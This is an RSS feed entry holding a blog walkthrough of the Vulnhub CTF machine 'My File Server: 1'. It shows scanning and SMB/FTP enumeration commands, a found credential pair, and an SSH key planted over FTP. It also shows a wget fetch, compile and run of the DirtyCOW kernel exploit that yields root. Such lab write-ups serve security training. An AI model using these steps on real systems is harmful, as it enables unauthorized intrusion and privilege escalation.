@@ -1,0 +1,149 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>My File Server: 1 walkthrought Archives - Armour Infosec</title>
+	<atom:link href="https://www.armourinfosec.com/tag/my-file-server-1-walkthrought/feed/" rel="self" type="application/rss+xml" />
+	<link>https://www.armourinfosec.com/tag/my-file-server-1-walkthrought/</link>
+	<description>Do Your Part - Be Security Smart</description>
+	<lastBuildDate>Thu, 09 Apr 2020 04:23:34 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=6.3.1</generator>
+
+<image>
+	<url>https://www.armourinfosec.com/wp-content/uploads/2018/02/ai.png</url>
+	<title>My File Server: 1 walkthrought Archives - Armour Infosec</title>
+	<link>https://www.armourinfosec.com/tag/my-file-server-1-walkthrought/</link>
+	<width>32</width>
+	<height>32</height>
+</image> 
+	<item>
+		<title>My File Server: 1 Walkthrough</title>
+		<link>https://www.armourinfosec.com/my-file-server-1-walkthrough/</link>
+					<comments>https://www.armourinfosec.com/my-file-server-1-walkthrough/#respond</comments>
+		
+		<dc:creator><![CDATA[Armour Infosec]]></dc:creator>
+		<pubDate>Sat, 28 Mar 2020 11:31:30 +0000</pubDate>
+				<category><![CDATA[Walkthrough]]></category>
+		<category><![CDATA[My File Server: 1 walkthrought]]></category>
+		<guid isPermaLink="false">https://www.armourinfosec.com/?p=25639</guid>
+
+					<description><![CDATA[<p>My File Server: 1 Walkthrough Vulnhub CTF My File Server: 1 Walkthrough Vulnhub CTF I will share with you a...</p>
+<p>The post <a rel="nofollow" href="https://www.armourinfosec.com/my-file-server-1-walkthrough/">My File Server: 1 Walkthrough</a> appeared first on <a rel="nofollow" href="https://www.armourinfosec.com/">Armour Infosec</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<h1>My File Server: 1 Walkthrough Vulnhub CTF</h1>
+<p><a href="https://www.vulnhub.com/entry/my-file-server-1,432/">My File Server: 1</a> Walkthrough Vulnhub CTF</p>
+<p>I will share with you a new Walkthrough for Vulnhub machines. My File Server: 1 This CTF machine is Created by Akanksha Sachin Verma You can download here this CTF . I would call this box on the easy side but there are a lot of moving parts which can cause you to follow some different directions. I don&#8217;t want to say to much so let&#8217;s get at it.</p>
+<h3><strong><img decoding="async" fetchpriority="high" class="alignnone wp-image-25641 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-15-52-57.png" alt="" width="801" height="602" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-15-52-57.png 801w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-15-52-57-300x225.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-15-52-57-768x577.png 768w" sizes="(max-width: 801px) 100vw, 801px" /></strong></h3>
+<h3><strong>Penetration Testing Methodologies</strong></h3>
+<p><strong>Network Scan</strong></p>
+<ul>
+<li>Netdicover</li>
+<li>Nmap</li>
+</ul>
+<p><strong>Enumeration</strong></p>
+<ul>
+<li>SMBMAP</li>
+<li>Nikto</li>
+</ul>
+<p><strong>Exploit</strong></p>
+<ul>
+<li>Injecting id_rsa.pub</li>
+</ul>
+<p><strong>Privilege Escalation</strong></p>
+<ul>
+<li>Kernel Exploit</li>
+<li>Capture the Flag.</li>
+</ul>
+<h4>Network Scanning</h4>
+<p>So, as we always start with netdiscover to get the IP of the VM machine and the IP of the host I’ve found is 192.168.2.5</p>
+<pre class="lang:sh decode:true ">netdiscover  -i vboxnet0</pre>
+<p><img decoding="async" class="alignnone wp-image-25640" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-15-55-24.png" alt="" width="600" height="132" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-15-55-24.png 554w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-15-55-24-300x66.png 300w" sizes="(max-width: 600px) 100vw, 600px" /></p>
+<p>Let’s proceed with network scan using Nmap aggressive scan as given below</p>
+<pre class="lang:sh decode:true ">nmap -p- -A 192.168.2.5</pre>
+<p><img decoding="async" class="alignnone wp-image-25642 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-16-00-58.png" alt="" width="671" height="592" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-16-00-58.png 671w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-16-00-58-300x265.png 300w" sizes="(max-width: 671px) 100vw, 671px" /></p>
+<h3>Enumeration</h3>
+<p>It was very interesting as there were so many services running on the host network. We saw FTP’s “anonymous login enabled” and port 445 was also available for SMB.</p>
+<p><img decoding="async" class="alignnone wp-image-25643 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-16-01-20.png" alt="" width="674" height="193" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-16-01-20.png 674w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-16-01-20-300x86.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-16-01-20-672x193.png 672w" sizes="(max-width: 674px) 100vw, 674px" /></p>
+<p>In order to enumerate SMB and identify a username as “smbuser” , I use the following command.</p>
+<pre class="lang:sh decode:true">smbmap -H 192.168.2.5
+smbclient  -L 192.168.2.5</pre>
+<p><img decoding="async" class="alignnone wp-image-25644 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-16-07-31.png" alt="" width="734" height="123" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-16-07-31.png 734w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-16-07-31-300x50.png 300w" sizes="(max-width: 734px) 100vw, 734px" /></p>
+<p>On applying the Nmap script for SMB we found a user named smbuser</p>
+<pre class="lang:sh decode:true ">nmap --script smb-enum-shares.nse -p445 192.168.2.6</pre>
+<p><img decoding="async" class="alignnone wp-image-25744 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-29-18-37-59.png" alt="" width="486" height="604" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-29-18-37-59.png 486w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-29-18-37-59-241x300.png 241w" sizes="(max-width: 486px) 100vw, 486px" /></p>
+<p>We also explore the IP host in the web browser as port 80 has been opened for the HTTP service. There was nothing special at web page just a link to Amrour Infosec.</p>
+<p><img decoding="async" class="alignnone wp-image-25646 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-16-13-11.png" alt="" width="576" height="216" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-16-13-11.png 576w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-16-13-11-300x113.png 300w" sizes="(max-width: 576px) 100vw, 576px" /></p>
+<p>I chose to run Nikto for HTTP weak config listing, and luckily found an entry for “readme.txt,” let’s test this in the web browser.</p>
+<pre class="lang:miva decode:true ">nikto -h http://192.168.2.5/</pre>
+<p><img decoding="async" class="alignnone wp-image-25647 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-16-14-57.png" alt="" width="898" height="341" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-16-14-57.png 898w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-16-14-57-300x114.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-16-14-57-768x292.png 768w" sizes="(max-width: 898px) 100vw, 898px" /></p>
+<p>I think the author has kept this file as a clue that he wants to get the password by searching the readme.txt file. So now I had the username “smbuser” and the password “rootroot1” and it was time to connect to the host machine via ssh, so I tried to use this cred for ssh login, but we got an error as connection timeout, which means that the username “smbuser” cannot connect to the host machine via ssh.</p>
+<p><img decoding="async" class="alignnone wp-image-25648 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-16-18-06.png" alt="" width="519" height="151" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-16-18-06.png 519w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-16-18-06-300x87.png 300w" sizes="(max-width: 519px) 100vw, 519px" /></p>
+<h3><strong>Exploitation</strong></h3>
+<p>Now time to generate some ssh keys, thus we used ssh-keygen to generate ssh public keys without password in our local machine i.e. KALI LINUX. Moving on after the key is created, we moved into the .ssh directory on our native shell, here we saw that we have the key named “id_rsa.pub”.</p>
+<p id="ba2f" class="fr fs ap ce ft b fu fv fw fx fy fz ga gb gc gd ge cx" data-selectable-paragraph="">Let’s generate keys for SSH so we can login into smbuser!</p>
+<p id="4de5" class="fr fs ap ce ft b fu fv fw fx fy fz ga gb gc gd ge cx" data-selectable-paragraph="">Steps:</p>
+<ol class="">
+<li id="5fbc" class="fr fs ap ce ft b fu fv fw fx fy fz ga gb gc gd ge ib ic id" data-selectable-paragraph="">Create ssh key pair by running ssh-keygen.</li>
+<li id="142c" class="fr fs ap ce ft b fu ie fw if fy ig ga ih gc ii ge ib ic id" data-selectable-paragraph="">Create .ssh directory on the mounted share /home/smbuser/.ssh</li>
+<li id="e0bd" class="fr fs ap ce ft b fu ie fw if fy ig ga ih gc ii ge ib ic id" data-selectable-paragraph="">Copy the content of the public key to /home/smbuser/.ssh.</li>
+<li id="0ea8" class="fr fs ap ce ft b fu ie fw if fy ig ga ih gc ii ge ib ic id" data-selectable-paragraph="">SSH into smbuser@_victim_ip_!</li>
+</ol>
+<pre class="lang:sh decode:true">ssh-keygen
+cd .ssh
+ls -lha
+</pre>
+<p><img decoding="async" class="alignnone wp-image-25649 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-16-22-53.png" alt="" width="524" height="308" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-16-22-53.png 524w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-16-22-53-300x176.png 300w" sizes="(max-width: 524px) 100vw, 524px" /></p>
+<p>With the help of above-enumerated creds “<strong>smbuser:rootroot1</strong>” we logged into FTP and create a folder as .ssh inside /home/smbuser, then try to upload the id_rsa.pub which we have generated in above mention step as authorized_keys  inside the .ssh directory.</p>
+<pre class="lang:sh decode:true">ftp 192.168.2.5
+pwd
+mkdir .ssh
+cd .ssh
+put /root/.ssh/.id_rsa.pub authorized_keys
+exit
+</pre>
+<p><img decoding="async" class="alignnone wp-image-25650 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-16-32-10.png" alt="" width="461" height="480" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-16-32-10.png 461w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-16-32-10-288x300.png 288w" sizes="(max-width: 461px) 100vw, 461px" /></p>
+<p>Now we should be able to ssh with the private key:</p>
+<pre class="lang:sh decode:true ">ssh -i id_rsa smbuser@192.168.2.5</pre>
+<p><img decoding="async" class="alignnone wp-image-25651 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-16-37-29.png" alt="" width="693" height="280" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-16-37-29.png 693w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-16-37-29-300x121.png 300w" sizes="(max-width: 693px) 100vw, 693px" /></p>
+<pre class="lang:sh decode:true ">uname -a</pre>
+<p>&nbsp;</p>
+<p>I found it’s a really old version of the kernel that’s built here, so I’m trying to check for a piece of code to exploit, and luckily, I find it to be a DIRTYCOW exploit. So, I download a hack from <a href="https://www.exploit-db.com/exploits/40616">Exploit-DB</a> written in c.</p>
+<p><img decoding="async" class="alignnone wp-image-25652" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-16-41-26.png" alt="" width="800" height="184" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-16-41-26.png 1258w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-16-41-26-300x69.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-16-41-26-1024x235.png 1024w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-16-41-26-768x176.png 768w" sizes="(max-width: 800px) 100vw, 800px" /></p>
+<h3><strong>Privilege Escalation </strong></h3>
+<p>I downloaded the exploit inside the host machine, and then compiled it before running the exploit, so I ran the following commands.</p>
+<pre class="lang:sh decode:true">python  -m SimpleHTTPServer 8080
+ON THE SHELL
+wget http://192.168.2.1:8080/40616.c
+gcc 40616.c -o dasagreeva -pthread
+./dasagreeva</pre>
+<p>Eureka&#8230;&#8230;. Root &#8230;&#8230;</p>
+<p><img decoding="async" class="alignnone wp-image-25654 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-16-50-14.png" alt="" width="809" height="442" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-16-50-14.png 809w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-16-50-14-300x164.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-16-50-14-768x420.png 768w" sizes="(max-width: 809px) 100vw, 809px" /></p>
+<p>Boom! We got root the shell by running ./<strong>dasagreeva</strong> and finally, we obtain <strong>proof.txt</strong> file.</p>
+<pre class="lang:sh decode:true">cd /root
+ls
+cat proof.txt
+id
+hostname</pre>
+<p><strong><img decoding="async" class="alignnone wp-image-25657 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-17-37-45.png" alt="" width="545" height="166" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-17-37-45.png 545w, https://www.armourinfosec.com/wp-content/uploads/2020/03/Screenshot-from-2020-03-28-17-37-45-300x91.png 300w" sizes="(max-width: 545px) 100vw, 545px" /></strong></p>
+<p><iframe width="560" height="315" src="https://www.youtube.com/embed/hcGBXtG7V64" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe></p>
+<p>The post <a rel="nofollow" href="https://www.armourinfosec.com/my-file-server-1-walkthrough/">My File Server: 1 Walkthrough</a> appeared first on <a rel="nofollow" href="https://www.armourinfosec.com/">Armour Infosec</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://www.armourinfosec.com/my-file-server-1-walkthrough/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+	</channel>
+</rss>
